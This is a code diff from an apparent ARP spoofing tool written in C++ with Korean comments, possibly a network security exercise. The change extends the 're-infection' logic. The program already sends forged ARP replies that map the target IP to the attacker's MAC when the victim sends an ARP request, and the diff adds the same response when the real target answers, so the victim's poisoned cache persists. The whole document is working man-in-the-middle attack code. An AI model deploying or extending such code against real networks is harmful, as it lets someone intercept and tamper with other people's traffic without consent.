@@ -258,10 +258,14 @@ int main(int argc, char* argv[]) {
             uint16_t op = ntohs(arp->op_);
             Ip sip = ntohl(arp->sip_);
             Ip tip = ntohl(arp->tip_);
-
+            Mac smac = arp->smac_;
+            Mac tmac = arp->tmac_;
+        
             for (auto& conn : connections) {
-                // tip만 target_ip와 일치하면 재감염
-                if (op == ArpHdr::Request && tip == conn.target_ip) {
+                // [1] sender가 target을 묻는 ARP Request
+                if (op == ArpHdr::Request &&
+                    sip == conn.sender_ip &&
+                    tip == conn.target_ip) {
                     EthArpPacket reinfect = make_arp_packet(
                         Mac(attacker_mac), conn.sender_mac,
                         Mac(attacker_mac), conn.sender_mac,
@@ -269,7 +273,22 @@ int main(int argc, char* argv[]) {
                         false
                     );
                     send_arp_packet(handle, reinfect);
-                    cout << "[*] Re-infection triggered: " << sip << " asking for " << tip << '\n';
+                    cout << "[*] Re-infection (Request): " << sip << " → " << tip << '\n';
+                }
+        
+                // [2] target이 sender에게 진짜 ARP Reply
+                else if (op == ArpHdr::Reply &&
+                         sip == conn.target_ip &&
+                         tip == conn.sender_ip &&
+                         smac == conn.target_mac) {
+                    EthArpPacket reinfect = make_arp_packet(
+                        Mac(attacker_mac), conn.sender_mac,
+                        Mac(attacker_mac), conn.sender_mac,
+                        conn.target_ip, conn.sender_ip,
+                        false
+                    );
+                    send_arp_packet(handle, reinfect);
+                    cout << "[*] Re-infection (Reply): " << sip << " → " << tip << '\n';
                 }
             }
         }
